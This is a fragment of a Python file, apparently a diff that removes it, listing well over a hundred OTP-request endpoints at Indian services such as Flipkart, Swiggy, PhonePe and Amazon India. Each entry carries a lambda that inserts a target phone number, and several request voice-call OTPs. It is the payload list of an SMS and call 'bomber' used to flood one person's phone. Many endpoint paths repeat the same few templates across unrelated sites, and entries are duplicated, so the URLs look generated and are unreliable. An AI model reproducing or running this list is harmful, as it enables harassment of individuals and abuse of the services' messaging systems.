-    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Meesho SMS', 'url': 'https://meesho.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Api-Gateway WhatsApp', 'url': 'https://api-gateway.juno.lenskart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra SMS', 'url': 'https://myntra.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Newme SMS', 'url': 'https://newme.asia/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Uber SMS', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Amazon Call', 'url': 'https://amazon.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Myntra Call', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Makemytrip WhatsApp', 'url': 'https://makemytrip.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Swiggy SMS', 'url': 'https://swiggy.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': '1Mg Call', 'url': 'https://1mg.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Zepto SMS', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Flipkart SMS', 'url': 'https://flipkart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
-    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': '1Mg WhatsApp', 'url': 'https://1mg.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
-    {'name': 'Pharmeasy Call', 'url': 'https://pharmeasy.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
-    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
-    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
-    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
